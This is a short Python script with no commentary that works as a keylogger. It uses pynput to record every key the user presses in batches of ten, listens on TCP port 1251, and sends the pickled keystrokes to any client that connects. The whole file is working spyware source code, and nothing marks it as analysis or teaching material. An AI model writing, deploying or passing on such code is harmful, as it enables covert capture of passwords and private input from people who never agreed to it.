from pynput.keyboard import Listener
import socket
from pickle import dumps

socket.setdefaulttimeout(2)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((socket.gethostname(), 1251))


class Safe:
    array = []
    index = 0
    multi = 1


def update_array(char):
    Safe.array.append(char)
    Safe.index += 1


def key_press(key):
    string_key = str(key).replace("'", "")
    update_array(string_key)
    if len(Safe.array) == 10:
        return False


while True:
    try:
        if not Safe.array:
            with Listener(on_press=key_press)as l:
                l.join()
            Safe.multi += 1
        else:
            s.listen(1)
            client_socket, address = s.accept()
            print(f"connection to {address} has been established")
            msg = dumps(Safe.array)
            client_socket.send(msg)
            Safe.array = []
            Safe.index = 0
            Safe.multi = 1
    except socket.timeout:
        continue







